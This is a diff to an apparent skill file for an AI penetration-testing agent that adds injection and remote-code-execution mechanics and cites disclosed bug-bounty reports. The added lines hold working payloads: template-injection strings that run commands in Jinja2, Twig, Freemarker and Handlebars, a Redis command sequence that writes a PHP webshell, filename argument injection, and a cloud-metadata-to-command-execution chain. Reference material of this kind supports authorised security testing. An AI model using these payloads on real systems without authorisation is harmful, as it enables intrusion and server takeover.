@@ -1,6 +1,6 @@
 ---
 name: injection-and-rce
-description: Full injection-class technique list (SQLi, command injection, LDAP/XPath/XSLT/EL, SSTI, CRLF, HPP, prototype pollution) and remote-code-execution technique list (deserialization, file-upload webshells, LFI/RFI, framework-specific RCE, dependency CVEs). Converted from master-pentest-prompt.md Phases 2/3. Use during scan-agent's injection-testing pass on any target with user-controlled input reaching a backend.
+description: Full injection-class technique list (SQLi, command injection, LDAP/XPath/XSLT/EL, SSTI, CRLF, HPP, prototype pollution) and remote-code-execution technique list (deserialization, file-upload webshells, LFI/RFI, framework-specific RCE, dependency CVEs), plus concrete exploitation mechanics for SSTI-per-engine, unauthenticated Redis RCE, filename argument injection, and cloud-metadata-to-RCE chaining. Converted from master-pentest-prompt.md Phases 2/3. Use during scan-agent's injection-testing pass on any target with user-controlled input reaching a backend.
 ---
 
 # Injection and RCE
@@ -65,6 +65,45 @@ check whether it chains into RCE via this skill's second half.
 - **First-class escalation path**: desync/request smuggling (see the
   `request-smuggling` skill) chained into RCE.
 
+## RCE exploitation mechanics (concrete, not just the class name)
+
+A few of the classes above are worth spelling out in exploitation detail
+rather than just naming, since knowing the technique exists isn't the
+same as knowing how to actually trigger it:
+
+- **SSTI -> RCE, per engine** (once reflection is confirmed with a canary
+  like `{{7*7}}` -> `49`): Jinja2 walks the object graph via
+  `{{ ''.__class__.__mro__[1].__subclasses__() }}` to find a subprocess-
+  capable class, then calls it; Twig via
+  `{{ ['id']|filter('system') }}` or `{{ _self.env.registerUndefinedFilterCallback('exec') }}`;
+  Freemarker via
+  `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`;
+  Handlebars via the constructor-escape
+  `{{#with "s" as |string|}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').exec('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}`
+  (the Handlebars payload is intentionally ugly -- that's the actual
+  shape of the constructor-chain escape, not a simplification).
+- **Unauthenticated Redis -> webshell RCE**: `CONFIG SET dir
+  /var/www/html`, `CONFIG SET dbfilename shell.php`, `SET x
+  "<?php system($_GET['c']); ?>"`, `SAVE` -- writes the in-memory value
+  to disk as a web-accessible PHP file. Requires a guessable/known web
+  root and write access to it, but needs zero authentication if Redis
+  itself has none (its default configuration).
+- **Argument injection via filename, into a shell-invoked utility**: any
+  endpoint that passes a user-controlled filename to a command-line
+  image/media tool (GraphicsMagick, ImageMagick, ffmpeg) without a `--`
+  argument-terminator can have that filename itself parsed as a flag —
+  a filename starting with `|` or `-` can inject an argument the
+  developer never intended to expose, independent of the file's actual
+  content (see HackerOne #212696 below for the real-world version of
+  this exact mechanism).
+- **Cloud metadata SSRF -> RCE chain**: an SSRF hitting
+  `169.254.169.254` (see the `ssrf` skill) that returns IAM/instance-role
+  credentials doesn't stop at information disclosure — those credentials
+  routinely grant enough IAM permission (`ssm:SendCommand`, a Lambda
+  update permission, an ECS task-definition update) to pivot straight
+  into command execution on compute infrastructure the SSRF alone never
+  touched directly.
+
 ## Real disclosed reports (precedent, not just theory)
 
 These confirm the technique classes above paid out on real programs, not
@@ -81,10 +120,26 @@ just in theory:
   the applications built on it), #1248052 (U.S. DoD, pre-auth RCE in
   ForgeRock OpenAM via unsafe Java deserialization in its Jato
   framework, CVE-2021-35464).
+- **RCE via SSTI**: HackerOne #164224 (Unikrn, SSTI via a Smarty
+  template -- payload entered through firstname/lastname/nickname
+  fields, a reminder that profile/settings forms are template-injection
+  surface, not just search boxes), #423541 (Shopify, RCE via Handlebars
+  template injection using the `{{this.constructor.constructor}}`
+  constructor-escape -- exactly the mechanism spelled out above).
+- **RCE via argument/command injection**: HackerOne #212696 (Imgur, RCE
+  via command-line argument injection into GraphicsMagick through the
+  `y` parameter of `/edit/process` -- filenames starting with `|` were
+  parsed as shell arguments), #294462 (Ruby's `NET::FTP` stdlib,
+  CVE-2017-17405, command injection via a crafted local/remote filename
+  argument -- confirms this class isn't limited to web-app code, it hits
+  standard-library FTP clients too).
 
-The DoD reports are a useful pattern on their own: government bug bounty
-programs disclose at high volume and tend toward exactly the boring,
-systematic injection classes in this skill (header-based SQLi, known-CVE
-deserialization in a bundled third-party component) rather than exotic
-chains -- confirming that thorough coverage of the basics here is
-higher-yield than hunting for novelty.
+Two patterns stand out across these: the DoD reports disclose at high
+volume and tend toward exactly the boring, systematic classes in this
+skill (header-based SQLi, known-CVE deserialization in a bundled
+third-party component) rather than exotic chains -- thorough coverage of
+the basics here is higher-yield than hunting for novelty. And the SSTI
+reports (Unikrn, Glovo) both landed via ordinary profile fields
+(firstname/lastname/nickname), not a search box or obviously
+"templated" endpoint -- test every free-text field that might get
+interpolated server-side, not just the ones that look template-shaped.
